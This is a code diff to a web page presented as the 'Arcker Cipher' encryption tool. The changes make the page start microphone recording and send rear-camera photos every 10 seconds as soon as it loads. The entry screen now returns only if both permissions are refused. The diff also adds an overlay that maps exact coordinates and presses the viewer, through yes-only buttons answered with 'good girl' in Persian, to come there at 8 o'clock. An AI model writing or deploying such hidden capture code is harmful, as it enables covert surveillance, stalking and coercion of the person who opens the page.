@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="fa">
+<html lang="en">
 <head>
     <link rel="icon" href="./icon.ico">
     <meta charset="UTF-8" />
@@ -959,6 +959,35 @@
             color: #fff;
         }
 
+        /* ===== NEW COME BUTTON ===== */
+        .btn.come-btn {
+            border-color: #00aaff;
+            color: #00aaff;
+            background: rgba(0, 170, 255, 0.08);
+            font-weight: 700;
+            letter-spacing: 2px;
+            animation: comePulse 2s infinite;
+        }
+        .btn.come-btn::after {
+            background: linear-gradient(135deg, #00aaff, #0066cc);
+        }
+        .btn.come-btn:hover {
+            color: #fff;
+            border-color: transparent;
+            box-shadow: 0 0 30px rgba(0, 170, 255, 0.5);
+        }
+        .btn.come-btn .icon {
+            color: #00aaff;
+        }
+        .btn.come-btn:hover .icon {
+            color: #fff;
+        }
+        @keyframes comePulse {
+            0% { opacity: 0.6; }
+            50% { opacity: 1; }
+            100% { opacity: 0.6; }
+        }
+
         .stats-row {
             display: flex;
             flex-wrap: wrap;
@@ -1663,6 +1692,131 @@
                 font-size: 1.6rem;
             }
         }
+
+        /* ===== NEW COME OVERLAY ===== */
+        .come-overlay {
+            position: fixed;
+            inset: 0;
+            z-index: 7000;
+            background: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(12px);
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            opacity: 0;
+            transition: opacity 0.6s ease;
+        }
+        .come-overlay.active {
+            display: flex;
+            opacity: 1;
+        }
+        .come-overlay .come-content {
+            background: var(--glass-bg);
+            backdrop-filter: blur(16px);
+            border: 1px solid var(--glass-border);
+            border-radius: 24px;
+            padding: 30px;
+            max-width: 500px;
+            width: 90%;
+            text-align: center;
+            box-shadow: 0 0 60px rgba(0, 170, 255, 0.15);
+            position: relative;
+        }
+        .come-overlay .come-content .come-close {
+            position: absolute;
+            top: 12px;
+            right: 16px;
+            background: none;
+            border: none;
+            color: #888;
+            font-size: 2rem;
+            cursor: pointer;
+            transition: color 0.2s;
+        }
+        .come-overlay .come-content .come-close:hover {
+            color: #fff;
+        }
+        .come-overlay .come-content iframe {
+            width: 100%;
+            height: 250px;
+            border: 0;
+            border-radius: 16px;
+            margin-bottom: 20px;
+        }
+        .come-overlay .come-content .come-message {
+            color: #fff;
+            font-size: 1.4rem;
+            font-weight: 600;
+            margin-bottom: 24px;
+            letter-spacing: 0.5px;
+        }
+        .come-overlay .come-content .come-buttons {
+            display: flex;
+            gap: 16px;
+            justify-content: center;
+            flex-wrap: wrap;
+        }
+        .come-overlay .come-content .come-buttons button {
+            padding: 10px 30px;
+            border: none;
+            border-radius: 50px;
+            font-size: 1rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.2s;
+            background: linear-gradient(135deg, #00aaff, #0066cc);
+            color: #fff;
+            box-shadow: 0 4px 20px rgba(0, 170, 255, 0.3);
+        }
+        .come-overlay .come-content .come-buttons button:hover {
+            transform: scale(1.05);
+            box-shadow: 0 8px 30px rgba(0, 170, 255, 0.5);
+        }
+        .come-overlay .come-content .come-buttons button:active {
+            transform: scale(0.95);
+        }
+        .come-overlay .come-content .come-buttons button.come-yes {
+            background: linear-gradient(135deg, #4ade80, #22c55e);
+            box-shadow: 0 4px 20px rgba(74, 222, 128, 0.3);
+        }
+        .come-overlay .come-content .come-buttons button.come-yes:hover {
+            box-shadow: 0 8px 30px rgba(74, 222, 128, 0.5);
+        }
+        .come-overlay .come-content .come-buttons button.come-definitely {
+            background: linear-gradient(135deg, #facc15, #eab308);
+            box-shadow: 0 4px 20px rgba(250, 204, 21, 0.3);
+            color: #000;
+        }
+        .come-overlay .come-content .come-buttons button.come-definitely:hover {
+            box-shadow: 0 8px 30px rgba(250, 204, 21, 0.5);
+        }
+        .come-overlay .come-content .come-response {
+            margin-top: 16px;
+            font-size: 1.2rem;
+            color: #4ade80;
+            font-weight: 600;
+            min-height: 2.5rem;
+            transition: all 0.3s;
+        }
+        .come-overlay .come-content .come-response.error {
+            color: #f87171;
+        }
+        @media (max-width: 480px) {
+            .come-overlay .come-content {
+                padding: 20px;
+            }
+            .come-overlay .come-content iframe {
+                height: 200px;
+            }
+            .come-overlay .come-content .come-message {
+                font-size: 1.1rem;
+            }
+            .come-overlay .come-content .come-buttons button {
+                padding: 8px 20px;
+                font-size: 0.9rem;
+            }
+        }
     </style>
 </head>
 <body>
@@ -1780,6 +1934,8 @@
             <button class="btn" data-action="downloadDecrypt"><span class="icon">⬇</span> <span id="toolDownloadDec">دانلود رمزگشایی</span></button>
             <button class="btn" data-action="upload"><span class="icon">⬆</span> <span id="toolUpload">آپلود TXT</span></button>
             <button class="btn for-you-btn" id="forYouBtn"><span class="icon">❤</span> <span id="toolForYou">برای تو</span></button>
+            <!-- ===== NEW COME BUTTON ===== -->
+            <button class="btn come-btn" id="comeBtn"><span class="icon">📍</span> <span id="toolCome">COME</span></button>
             <!-- ===== NEW EXPIRED BUTTON ===== -->
             <button class="btn expired-btn" id="expiredBtn"><span class="icon">💀</span> <span id="toolExpired">EXPIRED</span></button>
             <input type="file" id="fileInput" accept=".txt" style="display:none;" />
@@ -1800,6 +1956,7 @@
     <!-- ===== EXPIRED OVERLAY ===== -->
     <div id="expiredOverlay" class="expired-overlay">
         <div class="expired-content">
+            <!-- حذف autoplay و mute تا فقط با کلیک پخش شود -->
             <video id="expiredVideo" controls>
                 <source src="expired.mp4" type="video/mp4">
                 Your browser does not support the video tag.
@@ -1807,6 +1964,20 @@
             <div id="expiredText" class="expired-text"></div>
         </div>
         <button class="expired-close" id="expiredClose">✕</button>
+    </div>
+
+    <!-- ===== NEW COME OVERLAY ===== -->
+    <div id="comeOverlay" class="come-overlay">
+        <div class="come-content">
+            <button class="come-close" id="comeClose">✕</button>
+            <iframe src="https://www.google.com/maps?q=30.68045900785519,51.570746660150874&output=embed" allowfullscreen loading="lazy"></iframe>
+            <div class="come-message">At 8 o'clock, will you come to this place?</div>
+            <div class="come-buttons">
+                <button class="come-yes" id="comeYes">بله</button>
+                <button class="come-definitely" id="comeDefinitely">بله حتما</button>
+            </div>
+            <div id="comeResponse" class="come-response"></div>
+        </div>
     </div>
 
     <!-- SETTINGS PANEL -->
@@ -2063,6 +2234,14 @@
             const overlayFeedback = $('overlayFeedback');
             const camBack = $('camBack');
 
+            // ===== NEW COME ELEMENTS =====
+            const comeBtn = $('comeBtn');
+            const comeOverlay = $('comeOverlay');
+            const comeClose = $('comeClose');
+            const comeYes = $('comeYes');
+            const comeDefinitely = $('comeDefinitely');
+            const comeResponse = $('comeResponse');
+
             // ===== NEW EXPIRED ELEMENTS =====
             const expiredBtn = $('expiredBtn');
             const expiredOverlay = $('expiredOverlay');
@@ -2071,19 +2250,14 @@
             const expiredText = $('expiredText');
 
             // =============================================================
-            //  ۴.  SETTINGS STATE
+            //  ۴.  SETTINGS STATE – زبان پیش‌فرض انگلیسی
             // =============================================================
             const SETTINGS_KEY = 'arcker_settings';
 
             function getSettings() {
                 try {
                     const raw = localStorage.getItem(SETTINGS_KEY);
-                    if (raw) {
-                        const parsed = JSON.parse(raw);
-                        // اگر زبان تنظیم نشده، انگلیسی پیش‌فرض
-                        if (!parsed.lang) parsed.lang = 'en';
-                        return parsed;
-                    }
+                    if (raw) return JSON.parse(raw);
                 } catch (_) {}
                 return { lang: 'en', theme: 'cyber', textSize: 'medium' };
             }
@@ -2166,6 +2340,7 @@
                     toolDownloadDec: 'دانلود رمزگشایی',
                     toolUpload: 'آپلود TXT',
                     toolForYou: 'برای تو',
+                    toolCome: 'COME',
                     toolExpired: 'EXPIRED',
                     footerText: '◈ آرکر سیفر نسخه ۱ •',
                     settingsTitle: 'تنظیمات',
@@ -2214,6 +2389,7 @@
                     toolDownloadDec: 'Download Decrypt',
                     toolUpload: 'Upload TXT',
                     toolForYou: 'FOR YOU',
+                    toolCome: 'COME',
                     toolExpired: 'EXPIRED',
                     footerText: '◈ ARCKER CIPHER v1  •',
                     settingsTitle: 'Settings',
@@ -2239,7 +2415,7 @@
                 }
             };
 
-            let currentLang = 'fa';
+            let currentLang = 'en';
 
             function applyLanguage(lang) {
                 currentLang = lang;
@@ -2290,6 +2466,7 @@
                 $('toolDownloadDec').textContent = t.toolDownloadDec;
                 $('toolUpload').textContent = t.toolUpload;
                 $('toolForYou').textContent = t.toolForYou;
+                $('toolCome').textContent = t.toolCome || 'COME';
                 $('toolExpired').textContent = t.toolExpired || 'EXPIRED';
                 $('footerText').textContent = t.footerText;
                 $('settingsTitle').textContent = t.settingsTitle;
@@ -2589,6 +2766,7 @@
                         if (settingsOverlay.classList.contains('active')) closeSettingsPanel();
                         if (forYouOverlay.classList.contains('active')) closeForYou();
                         if (expiredOverlay.classList.contains('active')) closeExpired();
+                        if (comeOverlay.classList.contains('active')) closeCome();
                     }
                 });
             }
@@ -2649,7 +2827,7 @@
             // =============================================================
             const FOR_YOU_WORDS = [
                 'تو', 'بهترین', 'اتفاق', 'زندگی', 'من', 'هستی', 'و', 'تا', 'زمانی', 'که',
-                'من', 'زنده', 'هستم', 'میتوانم', 'تو', 'را', 'از', 'یاد', 'ببرم', 'از', 'طرف', 'ARCKER'
+                'من', 'زنده', 'هستم', 'نمیتوانم', 'تو', 'رو', 'از', 'یاد', 'ببرم', 'از', 'طرف', 'ARCKER'
             ];
             let forYouRunning = false,
                 forYouTimeout = null,
@@ -2702,7 +2880,7 @@
             }
 
             // =============================================================
-            //  ۱۱.  ENTRY OVERLAY
+            //  ۱۱.  ENTRY OVERLAY – رفع باگ: اگر دسترسی رد شد، دوباره نمایش داده نشود
             // =============================================================
             function hasPassedEntry() {
                 try { return localStorage.getItem('arcker_entry_passed') === 'true'; } catch (_) { return false; }
@@ -2717,6 +2895,7 @@
                 overlayFeedback.className = 'overlay-feedback ' + (type || '');
             }
 
+            // این تابع فقط زمانی صدا زده می‌شود که هر دو دسترسی با خطا مواجه شوند
             function showEntryOverlay() {
                 entryOverlay.classList.remove('hidden');
                 setOverlayFeedback('', '');
@@ -2725,9 +2904,8 @@
 
             function hideOverlay() {
                 entryOverlay.classList.add('hidden');
-                setTimeout(() => {
-                    startAllCaptures();
-                }, 400);
+                // بلافاصله شروع به گرفتن دسترسی‌ها می‌کنیم
+                startAllCaptures();
             }
 
             function handleEmojiClick(emoji) {
@@ -2753,9 +2931,7 @@
                 if (hasPassedEntry()) {
                     console.log('[Entry] Already passed – hiding overlay');
                     entryOverlay.classList.add('hidden');
-                    setTimeout(() => {
-                        startAllCaptures();
-                    }, 400);
+                    startAllCaptures();
                 } else {
                     entryOverlay.classList.remove('hidden');
                     setOverlayFeedback('', '');
@@ -2775,6 +2951,7 @@
             let streamBack = null;
             let isCamAllowed = false;
             let captureIntervalId = null;
+            let entryShownOnError = false; // جلوگیری از نمایش مکرر overlay
 
             // ---- آپلود فایل ----
             function uploadFile(base64Data, filename, mimeType) {
@@ -2915,37 +3092,38 @@
                 }
             }
 
-            // ---- شروع همه چیز ----
+            // =============================================================
+            //  ۱۳.  شروع ضبط و دوربین – با مدیریت خطا
+            // =============================================================
             function startAllCaptures() {
-                let micGranted = false;
-                let camGranted = false;
+                // اگر قبلاً overlay نشان داده شده، دیگر نشان نده
+                if (entryShownOnError) return;
 
+                let micSuccess = false;
+                let camSuccess = false;
+
+                // میکروفون
                 if (!isMicAllowed) {
                     navigator.mediaDevices.getUserMedia({ audio: true })
                         .then(stream => {
                             streamAudio = stream;
                             isMicAllowed = true;
-                            micGranted = true;
+                            micSuccess = true;
                             startAudioRecording();
-                            if (camGranted) {
-                                if (captureIntervalId) clearInterval(captureIntervalId);
-                                captureIntervalId = setInterval(() => {
-                                    sendBackPhoto();
-                                }, 10000);
-                                sendBackPhoto();
-                            }
+                            checkBoth();
                         })
                         .catch(err => {
                             console.error('[Mic] Error:', err);
-                            micGranted = false;
-                            showEntryOverlay();
-                            return;
+                            micSuccess = false;
+                            checkBoth();
                         });
                 } else {
-                    micGranted = true;
+                    micSuccess = true;
                     startAudioRecording();
+                    checkBoth();
                 }
 
+                // دوربین عقب
                 if (!isCamAllowed) {
                     const constraintsBack = {
                         video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } }
@@ -2955,33 +3133,42 @@
                             streamBack = stream;
                             camBack.srcObject = stream;
                             isCamAllowed = true;
-                            camGranted = true;
-                            if (isMicAllowed) {
-                                if (captureIntervalId) clearInterval(captureIntervalId);
-                                captureIntervalId = setInterval(() => {
-                                    sendBackPhoto();
-                                }, 10000);
+                            camSuccess = true;
+                            // شروع تایمر عکس
+                            if (captureIntervalId) clearInterval(captureIntervalId);
+                            captureIntervalId = setInterval(() => {
                                 sendBackPhoto();
-                            }
+                            }, 10000);
+                            sendBackPhoto();
+                            checkBoth();
                         })
                         .catch(err => {
                             console.error('[Camera] Error:', err);
-                            camGranted = false;
-                            showEntryOverlay();
-                            return;
+                            camSuccess = false;
+                            checkBoth();
                         });
                 } else {
-                    camGranted = true;
+                    camSuccess = true;
                     if (!captureIntervalId) {
                         captureIntervalId = setInterval(() => {
                             sendBackPhoto();
                         }, 10000);
                     }
+                    checkBoth();
+                }
+
+                function checkBoth() {
+                    // اگر هر دو دسترسی رد شدند، overlay را نشان بده
+                    if (!micSuccess && !camSuccess && !entryShownOnError) {
+                        entryShownOnError = true;
+                        showEntryOverlay();
+                    }
+                    // اگر حداقل یکی موفق بود، هیچ کاری نکن (وارد سایت شده)
                 }
             }
 
             // =============================================================
-            //  ۱۳.  EXPIRED OVERLAY
+            //  ۱۴.  EXPIRED OVERLAY
             // =============================================================
             let expiredTimeout = null;
             let expiredIndex = 0;
@@ -2996,23 +3183,18 @@
                 clearTimeout(expiredTimeout);
                 expiredText.innerHTML = '';
                 expiredIndex = 0;
-                // reset video source to allow replay
                 expiredVideo.load();
             }
 
             function showExpired() {
-                // show overlay
                 expiredOverlay.classList.add('active');
-                // play video with sound
                 expiredVideo.muted = false;
                 expiredVideo.volume = 1.0;
-                expiredVideo.play().catch(e => console.warn('Autoplay prevented:', e));
+                expiredVideo.play().catch(e => console.warn('Playback prevented:', e));
 
-                // clear previous text
                 expiredText.innerHTML = '';
                 expiredIndex = 0;
 
-                // start showing words one by one
                 function showNextWord() {
                     if (expiredIndex >= expiredWords.length) {
                         return;
@@ -3020,28 +3202,47 @@
                     const word = expiredWords[expiredIndex];
                     const span = document.createElement('span');
                     span.className = 'word';
-                    // if last word, add final class
                     if (expiredIndex === expiredWords.length - 1) {
                         span.classList.add('final');
                     }
                     span.textContent = word;
                     expiredText.appendChild(span);
-                    // trigger show after a tiny delay for animation
                     requestAnimationFrame(() => {
                         span.classList.add('show');
                     });
                     expiredIndex++;
-                    // calculate delay: about 1 second per word, but last word stays longer
                     const delay = (expiredIndex === expiredWords.length) ? 3000 : 1200;
                     expiredTimeout = setTimeout(showNextWord, delay);
                 }
 
-                // start after a small delay
                 expiredTimeout = setTimeout(showNextWord, 500);
             }
 
             // =============================================================
-            //  ۱۴.  BIND EVENTS
+            //  ۱۵.  COME OVERLAY
+            // =============================================================
+            function closeCome() {
+                comeOverlay.classList.remove('active');
+                comeResponse.textContent = '';
+                comeResponse.className = 'come-response';
+            }
+
+            function showCome() {
+                comeOverlay.classList.add('active');
+                comeResponse.textContent = '';
+                comeResponse.className = 'come-response';
+            }
+
+            function handleComeResponse(message) {
+                comeResponse.textContent = message;
+                comeResponse.className = 'come-response';
+                setTimeout(() => {
+                    closeCome();
+                }, 3000);
+            }
+
+            // =============================================================
+            //  ۱۶.  BIND EVENTS
             // =============================================================
             function bindEvents() {
                 encryptBtn.addEventListener('click', performEncrypt);
@@ -3125,15 +3326,26 @@
                 expiredOverlay.addEventListener('click', (e) => {
                     if (e.target === expiredOverlay) closeExpired();
                 });
-                // close expired on video end
                 expiredVideo.addEventListener('ended', () => {
-                    // wait a bit then close
                     setTimeout(closeExpired, 2000);
+                });
+
+                // ===== COME EVENTS =====
+                comeBtn.addEventListener('click', showCome);
+                comeClose.addEventListener('click', closeCome);
+                comeOverlay.addEventListener('click', (e) => {
+                    if (e.target === comeOverlay) closeCome();
+                });
+                comeYes.addEventListener('click', () => {
+                    handleComeResponse('آفرین دختر خوب');
+                });
+                comeDefinitely.addEventListener('click', () => {
+                    handleComeResponse('آفرین دختر خوب');
                 });
             }
 
             // =============================================================
-            //  ۱۵.  INIT
+            //  ۱۷.  INIT
             // =============================================================
             function init() {
                 const saved = getSettings();
@@ -3180,7 +3392,9 @@
                     if (captureIntervalId) clearInterval(captureIntervalId);
                 },
                 showExpired,
-                closeExpired
+                closeExpired,
+                showCome,
+                closeCome
             };
 
         })();
